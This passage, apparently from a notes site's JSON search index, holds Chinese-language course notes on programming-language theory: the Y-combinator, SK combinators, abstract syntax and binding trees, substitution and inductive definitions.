\u8868\u8fbe\u5f0f\u4e86\u3002\u800c\u5c06\u8fd9\u4e2a\u8fc7\u7a0b\u6253\u5305\u8d77\u6765\uff0c\u628a\u8fd9\u4e2a \\(\\mathsf{u}\\) \u63d0\u53d6\u51fa\u6765\uff1a</p> \\[ \\begin{align*} \\mathsf{fact} &amp;= \\mathsf{proto}\\ \\mathsf{proto}\\\\ &amp;= (\\lambda f.\\ \\mathsf{u}\\ (f\\ f))\\ (\\lambda f.\\ \\mathsf{u}\\ (f\\ f))\\\\ &amp;= (\\lambda v.\\ (\\lambda f.\\ v\\ (f\\ f))\\ (\\lambda f.\\ v\\ (f\\ f)))\\ \\mathsf{u}\\\\ &amp;= \\mathsf{Y}\\ \\mathsf{u} \\end{align*} \\] <p>\u8fd9\u91cc\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a \\(\\mathsf{Y} := \\lambda v.\\ (\\lambda f.\\ v\\ (f\\ f))\\ (\\lambda f.\\ v\\ (f\\ f))\\)\uff0c\u8fd9\u4e2a\u51fd\u6570\u5c31\u79f0\u4e3a Y-Combinator\uff0c\u7531\u5b83\u548c\u5176\u4ed6\u51fd\u6570\u7ec4\u5408\u5c31\u53ef\u4ee5\u5b9e\u73b0\u9012\u5f52\u3002</p> <p>\u4e5f\u79f0\u5176\u4e3a\u4e00\u4e2a\u4e0d\u52a8\u70b9\u7b97\u5b50\uff0c\u56e0\u4e3a\u5176\u6709\u4e00\u4e2a\u6027\u8d28\uff1a</p> \\[ \\begin{align*} \\mathsf{Y}\\ u &amp;= (\\lambda v.\\ (\\lambda f.\\ v\\ (f\\ f))\\ (\\lambda f.\\ v\\ (f\\ f)))\\ u\\\\ &amp;= (\\lambda f.\\ u\\ (f\\ f))\\ (\\lambda f.\\ u\\ (f\\ f))\\\\ &amp;= u\\ ((\\lambda f.\\ u\\ (f\\ f))\\ (\\lambda f.\\ u\\ (f\\ f)))\\\\ &amp;= u\\ (\\mathsf{Y}\\ u) \\end{align*} \\] <p>\u6240\u4ee5\u6e05\u6670\u53ef\u89c1 \\(\\mathsf{Y}\\) \u5b9e\u73b0\u4e86 \\(u\\) \u7684\u9012\u5f52\u3002</p>"},{"location":"cs/pl/ppl/topic1/#sk","title":"SK \u7ec4\u5408\u5b50\u6f14\u7b97","text":"<p>\u6709\u4e00\u5957\u65b0\u7684\u7cfb\u7edf\u53ef\u4ee5\u5b9e\u73b0\u548c\u4e0d\u542b\u81ea\u7531\u53d8\u91cf\u7684 \u03bb \u8868\u8fbe\u5f0f\u7b49\u4ef7\u7684\u80fd\u529b\uff0c\u4e14\u53ea\u6709\u4e24\u4e2a\u64cd\u4f5c\u7b26\uff0c\u5206\u522b\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>S \u7ec4\u5408\u5b50\uff1a\\(\\mathsf{S} := \\lambda x.\\ \\lambda y.\\ \\lambda z.\\ x\\ z\\ (y\\ z)\\)</li> <li>K \u7ec4\u5408\u5b50\uff1a\\(\\mathsf{K} := \\lambda x.\\ \\lambda y.\\ x\\)</li> </ul> <p>\u4ec5\u4ec5\u7528\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u7b26\u548c\u5b83\u4eec\u4e4b\u95f4\u7684 application \u5c31\u53ef\u4ee5\u6784\u9020\u4e0e \u03bb \u6f14\u7b97\u7b49\u4ef7\u7684\u8ba1\u7b97\u7cfb\u7edf\u3002\u6bd4\u5982\u6709\u4e9b\u8bf4\u6cd5\u4e2d\u79f0\u4e3a SKI \u7ec4\u5408\u5b50\uff0c\u591a\u51fa\u6765\u7684\u4e00\u4e2a \\(\\mathsf{I} = \\lambda x.\\ x\\) \u4e5f\u53ef\u4ee5\u7531 SK \u6784\u9020\u800c\u6765\uff1a\\(\\mathsf{I} = \\mathsf{S}\\ \\mathsf{K}\\ \\mathsf{K}\\)\u3002</p> <p>\u4e0a\u9762\u7684\u5b9a\u4e49\u4f7f\u7528\u4e86 \u03bb \u8868\u8fbe\u5f0f\uff0c\u5b9e\u9645\u4e0a SK \u4e5f\u53ef\u4ee5\u901a\u8fc7\u81ea\u5df1\u7684\u4e00\u5957\u72ec\u7acb\u7684\u89c4\u5219\u6765\u8fdb\u884c\u5b9a\u4e49\uff1a</p> <ul> <li>\\(\\mathsf{S}\\ x\\ y\\ z \\equiv x\\ z\\ (y\\ z)\\)</li> <li>\\(\\mathsf{K}\\ x\\ y \\equiv x\\)</li> </ul> <p>\u63a5\u4e0b\u6765\u662f\u5c06\u4efb\u610f\u95ed\u9879\u8f6c\u6362\u4e3a SK \u7ec4\u5408\u5b50\u8868\u793a\u7684\u65b9\u6cd5\uff1a</p> <ol> <li>\\(\\lambda x.\\ \\mathsf{M} \\equiv \\mathsf{K}\\ \\mathsf{M}\\)\uff08\u5982\u679c \\(\\mathsf{M}\\) \u4e2d\u4e0d\u5305\u542b\u53d8\u91cf \\(x\\)\uff09</li> <li>\\(\\lambda x.\\ x \\equiv \\mathsf{S}\\ \\mathsf{K}\\ \\mathsf{K}\\)</li> <li>\\(\\lambda x.\\ \\mathsf{U}\\ x \\equiv \\mathsf{U}\\)\uff08\u5982\u679c \\(\\mathsf{U}\\) \u4e2d\u4e0d\u5305\u542b\u53d8\u91cf \\(x\\)\uff09</li> <li>\\(\\lambda x.\\ \\mathsf{U}\\ \\mathsf{V} \\equiv \\mathsf{S}\\ (\\lambda x.\\ \\mathsf{U})\\ (\\lambda x.\\ \\mathsf{V})\\)\uff08\u5176\u4ed6\u60c5\u51b5\u8fdb\u884c\u62c6\u5206\uff09</li> </ol>"},{"location":"cs/pl/ppl/topic2/","title":"\u62bd\u8c61\u8bed\u6cd5\u6811\u4e0e\u5f52\u7eb3\u6cd5","text":"<p> \u7ea6 3203 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>Abstract</p> <p>\u7f16\u7a0b\u8bed\u8a00\u539f\u7406\u7b2c\u4e09\u81f3\u7b2c\u516d\u5468\u8bfe\u7a0b\u5185\u5bb9</p> <p>\u7531\u4e8e\u5927\u7fc1\u8001\u5e08\u8fd9\u90e8\u5206\u4e0a\u8bfe\u5439\u6c34\u975e\u5e38\u4e25\u91cd\uff0c\u6240\u4ee5\u5c31\u57fa\u672c\u53ea\u770b\u4e86 slide\uff0c\u4f46\u662f slide \u8d28\u91cf\u53c8\u975e\u5e38\u6349\u6025\uff0c\u5168\u662f\u5b57\u5168\u662f\u8bdd\uff0c\u5f88\u591a\u90fd\u662f\u4e00\u4e2a\u5b9a\u4e49\u5199\u4e00\u4e24\u9875\uff0c\u770b\u534a\u5929\u53d1\u73b0\u5176\u5b9e\u5c41\u90fd\u6ca1\u8bf4\uff0c\u6211\u53cd\u6b63\u5c31\u76f4\u63a5\u6284\u4e0b\u6765\u4e86\u3002\u6211\u751a\u81f3\u6000\u7591\u91cc\u9762\u6709\u5f88\u591a\u7684\u9519\u8bef\uff0c\u4f46\u4e5f\u5c31\u8fd9\u6837\u4e86\uff0c\u59d1\u4e14\u8ba4\u4e3a\u8fd9\u4e9b\u5b9a\u4e49\u90fd\u4e0d\u91cd\u8981\uff08</p>"},{"location":"cs/pl/ppl/topic2/#_2","title":"\u62bd\u8c61\u8bed\u6cd5\u6811","text":"<ul> <li>\u7c7b\u522b\uff08sort\uff09\uff1aast \u6309\u8bed\u6cd5\u7684\u4e0d\u540c\u5206\u6210\u4e0d\u540c\u7c7b\u522b \\(s\\)\uff0c\u7c7b\u522b\u7684\u96c6\u5408\u8bb0\u4f5c \\(S\\)<ul> <li>\u8bed\u6cd5\u4e66\u6839\u636e\u8bed\u4e49\u7684\u4e0d\u540c\u6709\u4e0d\u540c\u7684\u7c7b\u522b</li> </ul> </li> <li>\u8fd0\u7b97\u7b26 \\(o\\)\uff0c\u5176\u96c6\u5408 \\(O_s\\) \u662f\u67d0\u4e2a \\(s\\) \u4e0a\u7684\u96c6\u5408<ul> <li>\u5143\u6570\uff08arity\uff09\u89c4\u5b9a\u4e86\u8fd0\u7b97\u7b26\u7684\u7c7b\u522b\u3001\u53c2\u6570\u7684\u4e2a\u6570 \\(n\\)\u3001\u53c2\u6570\u7684\u7c7b\u522b \\(s_i\\)\uff0c\u8bb0\u4f5c \\((s_1, \\cdots, s_n)s\\)<ul> <li>\u7406\u89e3\u4e3a\u8bb0\u5f55\u4e00\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u7c7b\u578b\u548c\u8fd4\u56de\u503c\u7c7b\u578b</li> </ul> </li> </ul> </li> <li>\u53d8\u91cf \\(x\\)\uff0c\u96c6\u5408 \\(X_s\\)\uff0c\u4e3a\u67d0\u4e2a \\(s\\) \u4e0a\u7684\u96c6\u5408\uff0c\u53d8\u91cf\u65cf \\(X=\\{X_s\\}_{s\\in S}\\)<ul> <li>\u53d8\u91cf\u662f\u67d0\u4e2a\u9886\u57df\u5185\u7684\u4f4d\u7f6e\u5bf9\u8c61\uff0c\u53ef\u4ee5\u7528\u7279\u5b9a\u5bf9\u8c61\u4ee3\u6362\uff08substitution\uff09\u67d0\u4e2a\u8868\u8fbe\u5f0f\u4e2d\u7684\u5168\u90e8\u540c\u4e2a\u53d8\u91cf\u6765\u53d8\u6210\u5df2\u77e5</li> </ul> </li> <li>\u7ed3\u6784\u5f52\u7eb3\u6cd5\uff08structural induction\uff09<ul> <li>\u5bf9\u4e8e\u67d0\u4e2a\u7c7b\u522b\u7684\u6240\u6709 ast \\(a\\)\uff0c\u90fd\u5177\u6709\u6027\u8d28 \\(P(a)\\)\uff0c\u5219\u8003\u8651\u6240\u6709\u53ef\u4ee5\u751f\u6210 \\(a\\) \u7684\u65b9\u5f0f\uff0c\u5e76\u8bc1\u660e\u6bcf\u79cd\u60c5\u51b5\u4e0b\u5176\u5b50 ast \u90fd\u6709\u8be5\u6027\u8d28\uff0c\u5219\u751f\u6210\u7684 \\(a\\) \u4e5f\u6709\u8be5\u6027\u8d28</li> <li>\u7528\u6ee1\u8db3\u6027\u8d28\u7684 ast \u4ee3\u6362\u53d8\u91cf\uff0c\u5f97\u5230\u7684\u4ee3\u6362\u7ed3\u679c\u4e5f\u6ee1\u8db3\u8be5\u6027\u8d28</li> </ul> </li> </ul> PPT \u91cc\u53ed\u53ed\u7684\u7ed5\u6765\u7ed5\u53bb\u8fd8\u611f\u89c9\u5c41\u7528\u6ca1\u6709\u7684\u201c\u5b9a\u4e49\u201d <ul> <li>\u8bb0 \\(S\\) \u4e3a\u7c7b\u522b sort \u7684\u6709\u9650\u96c6\u5408\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u7c7b\u522b\u96c6\u5408 \\(S\\)\uff0c\u4e00\u4e2a\u5177\u6709\u5f62\u5f0f \\((s_1, \\cdots, s_n)s\\) \u7684\u5143\u6570\u8868\u793a\u4e00\u4e2a\u7c7b\u522b\u4e3a \\(s\\in S\\) \u7684\u8fd0\u7b97\u7b26\uff0c\u5b83\u63a5\u53d7 \\(n\\geq 0\\) \u4e2a\u53c2\u6570\uff0c\u7b2c \\(i\\) \u4e2a\u53c2\u6570\u7684\u7c7b\u522b\u4e3a \\(s_i\\in S\\)\uff0c\u4ee4 \\(O=\\{O_a\\}\\) \u4e3a\u4e00\u4e2a\u6309\u5143\u6570\u7d22\u5f15\u7684\u3001\u7531\u5177\u6709\u5143\u6570 \\(a\\) \u7684\u8fd0\u7b97\u7b26\u96c6\u5408 \\(O_a\\) \u6784\u6210\u7684\u4e0d\u76f8\u4ea4\u7684\u96c6\u65cf\uff08family\uff09\uff0c\u5982\u679c \\(o\\) \u662f\u4e00\u4e2a\u5143\u6570\u4e3a \\((s_1, \\cdots, s_n)s\\) \u7684\u8fd0\u7b97\u7b26\uff0c\u5219\u79f0 \\(o\\) \u7684\u7c7b\u522b\u4e3a \\(s\\) \u4e14\u6709 \\(n\\) \u4e2a\u7c7b\u522b\u5206\u522b\u4e3a \\(s_1, \\cdots, s_n\\) \u7684\u53c2\u6570</li> <li>\u56fa\u5b9a\u4e00\u4e2a\u7c7b\u522b\u96c6\u5408 \\(S\\) \u548c\u4e00\u4e2a\u6309\u5143\u6570\u7d22\u5f15\u7684\u3001\u4e0d\u540c\u5143\u6570\u7684\u8fd0\u7b97\u7b26\u96c6\u65cf \\(O\\)\uff0c\u4ee4 \\(X=\\{X_s\\}_{s\\in S}\\)\uff0c\u5176\u4e2d \\(X_s\\) \u4e3a\u7c7b\u522b \\(s\\) \u7684\u53d8\u91cf \\(x\\) \u6240\u5f62\u6210\u7684\u96c6\u5408\uff0c\\(X\\) \u4e3a\u5404\u4e0d\u76f8\u4ea4\u6709\u9650\u96c6 \\(X_s\\) \u7ec4\u6210\u7684\uff0c\u6309\u7c7b\u522b\u7d22\u5f15\u7684\u53d8\u91cf\u96c6\u65cf<ul> <li>\u5f53 \\(X\\) \u4e0a\u4e0b\u6587\u65e0\u5173\u65f6\uff0c\u5982\u679c\u53d8\u91cf \\(x\\in X\\)\uff0c\u5219\u79f0 \\(x\\) \u7684\u7c7b\u522b\u4e3a \\(s\\)</li> <li>\u5982\u679c\u5bf9\u4efb\u4f55\u7c7b\u578b \\(s\\) \u90fd\u6709 \\(x\\notin X_s\\)\uff0c\u5219\u79f0 \\(x\\) \u5bf9\u4e8e \\(X\\) \u6765\u8bf4\u662f\u65b0\uff08fresh\uff09\u7684\uff0c\u6216\u8005\u5728\u7406\u89e3 \\(X\\) \u65f6\u662f\u65b0\u7684</li> <li>\u5982\u679c \\(x\\) \u5bf9 \\(X\\) \u662f\u65b0\u7684\uff0c\u5e76\u4e14 \\(s\\) \u662f\u7c7b\u522b\uff0c\u5219 \\(X,x\\) \u662f\u901a\u8fc7\u589e\u52a0 \\(x\\) \u5230 \\(X_s\\) \u6240\u5f97\u5230\u7684\u53d8\u91cf\u96c6\u65cf<ul> <li>\u8fd8\u7b97\u7a0d\u5fae\u6709\u70b9\u7528\u7684\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b0\u5199\u6cd5 \\(X,x\\)</li> </ul> </li> </ul> </li> </ul> <ul> <li>\u62bd\u8c61\u8bed\u6cd5\u6811\u7684\u65cf<ul> <li>\\(A[X] = \\{A[X]_s\\}_{s\\in S}\\) \u662f\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\u7684\u6700\u5c0f\u65cf\uff1a<ul> <li>\u4e00\u4e2a\u7c7b\u522b\u4e3a \\(s\\) \u7684\u53d8\u91cf\u662f\u4e00\u68f5\u7c7b\u522b\u4e3a \\(s\\) \u7684 ast\uff1a\u5982\u679c \\(x\\in X_s\\)\uff0c\u5219 \\(x\\in A[X]_s\\)</li> <li>\u7528\u8fd0\u7b97\u7b26\u53ef\u4ee5\u7ec4\u5408 ast\uff1a\u5982\u679c \\(o\\) \u662f\u4e00\u4e2a\u5143\u6570\u4e3a \\((s_1, \\cdots, s_n)s\\) \u7684\u8fd0\u7b97\u7b26\uff0c\u4e14 \\(a_1\\in A[X]_{s_1}, \\cdots, a_n\\in A[X]_{s_n}\\)\uff0c\u5219 \\(o(a_1, \\cdots, a_n)\\in A[X]_s\\)</li> </ul> </li> </ul> </li> <li>\u4ee3\u6362<ul> <li>\u53d8\u91cf\u901a\u8fc7\u4ee3\u6362\u8d4b\u4e88\u542b\u4e49\uff1a\u5982\u679c \\(a\\in A[X, x]_s\\)\uff0c\u4e14 \\(b\\in A[X]_s\\)\uff0c\u5219\u7528 \\(b\\) \u4ee3\u6362 \\(a\\) \u4e2d\u51fa\u73b0\u7684\u6240\u6709 \\(x\\) \u5f97\u5230\u7684\u7ed3\u679c\u662f \\([b/x]a\\in A[X]\\)</li> <li>\u5b9a\u4e49 ast \\(a\\) \u4e3a\u4ee3\u6362\u76ee\u6807 target\uff0c\u800c \\(x\\) \u4e3a\u4ee3\u6362\u4e3b\u9898 subject\uff0c\u4ee3\u6362\u7531\u4ee5\u4e0b\u7b49\u5f0f\u5b9a\u4e49\uff1a<ul> <li>\\([b/x]x = b\\)\uff0c\u4e14\u5f53 \\(x\\neq y\\) \u65f6\uff0c \\([b/x]y = y\\)</li> <li>\\([b/x]o(a_1, \\cdots, a_n) = o([b/x]a_1, \\cdots, [b/x]a_n)\\)</li> </ul> </li> <li>\u5b9a\u7406\uff1a\u5982\u679c \\(a\\in A[X, x]\\)\uff0c\u5219\u5bf9\u4e8e\u4efb\u610f \\(b\\in A[X]\\) \u90fd\u5b58\u5728\u552f\u4e00\u7684 \\(c\\in A[x]\\) \u6ee1\u8db3 \\([b/x]a = c\\)</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic2/#_3","title":"\u62bd\u8c61\u7ed1\u5b9a\u6811","text":"<ul> <li>abt \u662f\u5bf9 ast \u7684\u6269\u5c55\uff0c\u5f15\u5165\u5177\u6709\u6307\u5b9a\u4f5c\u7528\u57df\u7684\u65b0\u53d8\u91cf\u548c\u7b26\u53f7</li> <li>\\(\\text{let }x\\text{ be }a_1\\text{ in }a_2\\)\uff0c\u4ee4 \\(a_2\\) \u4e2d\u7684 \\(x\\) \u4e3a \\(a_1\\)<ul> <li>\u53d8\u91cf \\(x\\) \u53d7 \\(\\text{let}\\) \u8868\u8fbe\u5f0f\u7ea6\u675f\u7528\u4e8e \\(a_2\\) \u4e2d</li> <li>\u7ea6\u675f\u53d8\u91cf\u53ef\u4ee5\u6362\u540d</li> </ul> </li> <li>\u7ea6\u675f\u7ed1\u5b9a<ul> <li>abt \u901a\u8fc7\u5141\u8bb8\u8fd0\u7b97\u7b26\u628a\u4efb\u610f\u6709\u9650\u4e2a\u53d8\u91cf\u7ed1\u5b9a\u5230\u6bcf\u4e2a\u53c2\u6570\u4e2d\u6765\u6cdb\u5316 ast</li> <li>\u8fd0\u7b97\u7b26 \\(a\\) \u7684\u53c2\u6570\u79f0\u4f5c\u62bd\u8c61\u5b50\uff08abstractor\uff09\uff0c\u5177\u6709 \\(x_1, \\cdots, x_k.a\\) \u7684\u5f62\u5f0f\uff08\u5f53 \\(k=0\\) \u65f6\u53ef\u5199\u4f5c \\(a\\)\uff09</li> <li>\u53d8\u91cf\u5e8f\u5217 \\(x_1, \\cdots, x_k\\) \u5728 abt a \u4e2d\u662f\u7ea6\u675f\u7684</li> <li>\\(\\text{let }x\\text{ be }a_1\\text{ in }a_2\\) \u5c31\u662f \\(\\mathrm{let}(a_1; x.a_2)\\) \u8fd9\u4e2a\u5f62\u5f0f\u8868\u660e \\(x\\) \u5728 \\(a_2\\) \u662f\u7ea6\u675f\u7684<ul> <li>\\(\\mathrm{let}()\\) \u7684\u7ed3\u679c\u662f\u4e00\u4e2a ast</li> </ul> </li> <li>\u5c06 \\(x_1, \\cdots, x_n\\) \u8868\u793a\u4e3a \\(\\overrightarrow{x}\\)\uff0c\u5219 \\(x_1, \\cdots, x_n.a\\) \u8868\u793a\u4e3a \\(\\overrightarrow{x}.a\\)</li> <li>\u8fd0\u7b97\u7b26\u88ab\u8d4b\u4e88\u5f62\u5982 \\((v_1, \\cdots, v_n)s\\) \u7684\u6cdb\u5316\u5143\u6570\uff08generalized arity\uff09\uff0c\u8fd9\u4e2a\u5f62\u5f0f\u89c4\u5b9a\u4e86\u7c7b\u522b\u4e3a $s\u3001\u5e26 \\(n\\) \u4e2a\u4ef7\uff08valence\uff09\u4e3a \\(v_1, \\cdots, v_n\\) \u7684\u53c2\u6570\u7684\u8fd0\u7b97\u7b26<ul> <li>\u4ef7 \\(v\\) \u7684\u5f62\u5f0f\u4e3a \\(s_1, \\cdots, s_k.s\\)\uff0c\u6307\u5b9a\u4e86\u53c2\u6570\u7684\u7c7b\u522b\u4ee5\u53ca\u6240\u7ed1\u5b9a\u7684\u53d8\u91cf\u7684\u6570\u91cf\u548c\u7c7b\u522b</li> <li>\u53d8\u91cf\u5e8f\u5217 \\(\\overrightarrow{x}\\) \u5c5e\u4e8e\u7c7b\u522b \\(\\overrightarrow{s}\\)\uff0c\u662f\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u5411\u91cf\u6709\u76f8\u540c\u7684\u957f\u5ea6 \\(k\\)\uff0c\u5e76\u4e14\u5bf9\u6bcf\u4e00\u4e2a \\(1\\leq i\\leq k\\) \u90fd\u6709\u53d8\u91cf \\(x_i\\) \u5c5e\u4e8e\u7c7b\u522b \\(s_i\\)</li> </ul> </li> </ul> </li> <li>\u62bd\u8c61\u7ed1\u5b9a\u6811\u7684\u65cf<ul> <li>\u56fa\u5b9a\u4e00\u4e2a\u7c7b\u522b\u96c6\u5408 \\(S\\) \u548c\u4e00\u4e2a\u6309\u5176\u6cdb\u5316\u5143\u6570\u7d22\u5f15\u7684\u8fd0\u7b97\u7b26\u7684\u4e0d\u76f8\u4ea4\u96c6\u65cf \\(O\\)\uff0c\u5bf9\u7ed9\u5b9a\u7684\u4e00\u65cf\u4e0d\u76f8\u4ea4\u7684\u53d8\u91cf\u96c6\u5408 \\(X\\)\uff0c\u62bd\u8c61\u7ed1\u5b9a\u6811\u7684\u65cf\uff08abt \u7684 \\(B[X]\\)\uff09 \u7684\u5b9a\u4e49\u4e0e \\(A[X]\\) \u7c7b\u4f3c\uff0c\u4f46\u662f\u5176\u4e2d\u7684 \\(X\\) \u5728\u5b9a\u4e49\u4e2d\u662f\u4e0d\u56fa\u5b9a\u7684\uff0c\u800c\u662f\u5f53\u8fdb\u5165\u62bd\u8c61\u5b50\u7684\u4f5c\u7528\u57df\u65f6\u4f1a\u53d1\u751f\u53d8\u5316</li> <li>\u5b9a\u4e49\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\u7684\u95ed\u5408\u7684\u6700\u5c0f\u96c6\u65cf\uff1a<ul> <li>\u5982\u679c \\(x\\in X_s\\)\uff0c\u5219 \\(x\\in B[X]\\)</li> <li>\u5bf9\u4efb\u610f\u5143\u6570\u4e3a \\((\\overrightarrow{s_1}, \\cdots, \\overrightarrow{s_n}.s_n)\\) \u7684\u8fd0\u7b97\u7b26 \\(o\\)\uff0c\u5982\u679c \\(a_1\\in B[X, \\overrightarrow{x_1}]_{s_1}, \\cdots\\)\uff0c\u4e14 \\(a_n\\in B[X, \\overrightarrow{x_n}]_{s_n}\\)\uff0c\u5219 \\(o(\\overrightarrow{x_1}.a_1; \\cdots; \\overrightarrow{x_n}a_n)\\in B[X]_s\\)</li> </ul> </li> </ul> </li> <li>\\(\\alpha\\) \u7b49\u4ef7\u5173\u7cfb<ul> <li>\\(a =_\\alpha b\\) \u8868\u793a \\(a\\) \u548c \\(b\\) \u5728\u4e0d\u8003\u8651\u7ea6\u675f\u53d8\u91cf\u540d\u7684\u9009\u62e9\u4e0b\u662f\u76f8\u540c\u7684</li> <li>\u79f0 \\(a\\) \u548c \\(b\\) \u4e92\u4e3a \\(\\alpha\\) \u53d8\u4f53\uff08\\(\\alpha\\)-variant\uff09</li> </ul> </li> <li>\u4ee3\u6362\uff1a\u7528\u7c7b\u522b\u4e3a \\(s\\) \u7684 abt \\(b\\) \u4ee3\u6362 abt \\(a\\) \u4e2d\u81ea\u7531\u51fa\u73b0\u7684\u7c7b\u522b\u4e3a \\(s\\) \u7684 \\(x\\)\uff0c\u5199\u4f5c \\([b/x]a\\)</li> <li>\u6807\u8bc6\u7ea6\u5b9a\uff1aabt \u603b\u662f\u6839\u636e \\(\\alpha\\) \u7b49\u4ef7\u51b3\u5b9a\u662f\u5426\u76f8\u540c</li> </ul>"},{"location":"cs/pl/ppl/topic2/#_4","title":"\u5f52\u7eb3\u63a8\u7406","text":"<ul> <li>\u5224\u65ad\uff08judgment\uff09\uff1a\u5173\u4e8e\u67d0\u79cd\u7c7b\u522b\u7684\u4e00\u68f5\u6216\u591a\u68f5 abt \u7684\u9648\u8ff0<ul> <li>\u4e00\u4e9b\u5224\u65ad\u7684\u4f8b\u5b50\uff1a<ul> <li>\\(n\\ \\mathrm{nat}\\)\uff1a\\(n\\) \u662f\u4e00\u4e2a\u81ea\u7136\u6570</li> <li>\\(n_1 + n_2 = n\\)\uff1a\\(n\\) \u662f \\(n_1\\) \u548c \\(n_2\\) \u7684\u548c</li> <li>\\(\\tau\\ \\mathrm{type}\\)\uff1a\\(\\tau\\) \u662f\u4e00\u4e2a\u7c7b\u578b</li> <li>\\(e:\\tau\\)\uff1a\u8868\u8fbe\u5f0f \\(e\\) \u5177\u6709\u7c7b\u578b \\(\\tau\\)</li> <li>\\(e\\Downarrow v\\)\uff1a\u8868\u8fbe\u5f0f \\(e\\) \u7684\u503c\u4e3a \\(v\\)</li> </ul> </li> <li>\u5224\u65ad\u7684\u4f5c\u7528\uff1a<ul> <li>\u8868\u660e\u4e00\u68f5\u6216\u591a\u68f5 abt \u5177\u6709\u67d0\u79cd\u6027\u8d28</li> <li>\u8868\u660e\u4e00\u68f5\u6216\u591a\u68f5 abt \u5f7c\u6b64\u4e4b\u95f4\u5b58\u5728\u67d0\u79cd\u5173\u7cfb</li> </ul> </li> <li>\u4e00\u4e9b\u540d\u8bcd\uff1a<ul> <li>\u5224\u65ad\u5f62\u5f0f\uff08judgment form\uff09\uff1aabt \u6240\u5177\u6709\u7684\u6027\u8d28\u6216\u5173\u7cfb</li> <li>\u5224\u65ad\u5f62\u5f0f\u7684\u5b9e\u4f8b\uff08instance\uff09\uff1a\u5bf9\u6027\u8d28\u6216\u5173\u7cfb\u7684\u4e00\u4e2a\u5224\u65ad</li> <li>\u8c13\u8bcd\uff08predicate\uff09\uff1a\u5224\u65ad\u5f62\u5f0f</li> <li>\u4e3b\u8bed\uff08subject\uff09\uff1a\u6784\u6210\u5b9e\u4f8b\u7684\u5bf9\u8c61</li> <li>\u8bb0\u6cd5 \\(a\\ J\\) \u8868\u793a abt \\(a\\) \u5177\u6709 \\(J\\) \u6027\u8d28\uff0c\\(-J\\)\uff1a\u4e0d\u6807\u8bb0\u53c2\u6570\u7684 \\(J\\)</li> </ul> </li> </ul> </li> <li>\u89c4\u5219\uff08rule\uff09\uff1a\u89c4\u5b9a\u4e86\u4e00\u4e2a\u5224\u65ad\u6709\u6548\u7684\u5145\u8981\u6761\u4ef6\uff0c\u56e0\u6b64\u4e5f\u5c31\u51b3\u5b9a\u4e86\u8fd9\u4e2a\u5224\u65ad\u7684\u542b\u4e49</li> </ul>"},{"location":"cs/pl/ppl/topic2/#_5","title":"\u63a8\u7406\u89c4\u5219","text":"<ul> <li>\u5224\u65ad\u5f62\u5f0f\u7684\u5f52\u7eb3\u5b9a\u4e49\uff08inductive definition\uff09\u8868\u8fbe\u4e3a \\(\\dfrac{J_1\\cdots J_k}{J}\\)<ul> <li>\u5f53 \\(J_1, \\cdots, J_k\\) \u90fd\u6210\u7acb\u65f6\uff0c\\(J\\) \u4e5f\u6210\u7acb\uff08\u53cd\u4e4b\u4e0d\u4e00\u5b9a\uff09</li> <li>\u524d\u63d0\uff08premise\uff09\uff1a\u5206\u5b50\uff1b\u7ed3\u8bba\uff08conclusion\uff09\uff1a\u5206\u6bcd</li> <li>\u516c\u7406\uff08axiom\uff09\uff1a\u6ca1\u6709\u524d\u63d0\uff1b\u6b63\u5e38\u89c4\u5219\uff08proper rule\uff09\uff1a\u6709\u524d\u63d0</li> </ul> </li> <li>\u5f52\u7eb3\u5b9a\u4e49\u4f8b\u5b50\uff1a<ul> <li>\\(-\\mathrm{nat}\\)\uff1a\\(\\dfrac{}{\\mathsf{zero}\\ \\mathrm{nat}}, \\dfrac{a\\ \\mathrm{nat}}{\\mathrm{succ}(a)\\ \\mathrm{nat}}\\)</li> <li>\\(-\\mathrm{tree}\\)\uff1a\\(\\dfrac{}{\\mathsf{empty}\\ \\mathrm{tree}}, \\dfrac{a_1\\ \\mathrm{tree}\\ \\ a_2\\ \\mathrm{tree}}{\\mathrm{node}(a_1; a_2)\\ \\mathrm{tree}}\\)</li> <li>\\(a\\ \\mathrm{is}\\ b\\)\uff08\u4e24\u68f5 abt \u76f8\u7b49\uff09\uff1a\\(\\dfrac{}{\\mathsf{zero}\\ \\mathrm{is}\\ \\mathsf{zero}}, \\dfrac{a\\ \\mathrm{is}\\ b}{\\mathrm{succ}(a)\\ \\mathrm{is}\\ \\mathrm{succ}(b)}\\)</li> </ul> </li> <li>\u89c4\u5219\u6a21\u5f0f\uff08rule scheme\uff09\uff1a\u4ee5\u4e0a\u7684\u5b9a\u4e49\u90fd\u662f\u6709\u9650\u7684\u5224\u65ad\uff0c\u4f46\u53ef\u4ee5\u63a8\u51fa\u65e0\u9650\u7684\u89c4\u5219\uff0c\u8fd9\u6837\u7684\u6709\u9650\u7684\u6a21\u5f0f\u79f0\u4e3a\u89c4\u5219\u6a21\u5f0f</li> <li>\u89c4\u5219\u6a21\u5757\u7684\u5b9e\u4f8b\uff1a\u4e3a\u89c4\u5219\u4e2d\u5bf9\u8c61\u7684\u6bcf\u4e00\u4e2a\u9009\u62e9\u786e\u5b9a\u7684\u4e00\u6761\u89c4\u5219</li> <li>\u4e24\u79cd\u5f52\u7eb3\u5b9a\u4e49\uff1a<ul> <li>\u8fed\u4ee3\uff08iteration\uff09\u5f52\u7eb3\u5b9a\u4e49\uff1a\u4e00\u4e2a\u5f52\u7eb3\u5b9a\u4e49\u5efa\u7acb\u5728\u53e6\u4e00\u4e2a\u5f52\u7eb3\u5b9a\u4e49\u4e4b\u4e0a<ul> <li>e.g. \\(\\dfrac{}{\\mathsf{nil}\\ \\mathrm{list}}, \\dfrac{a\\ \\mathrm{nat}\\ \\ b\\ \\mathrm{list}}{\\mathrm{cons}(a; b)\\ \\mathrm{list}}\\)</li> </ul> </li> 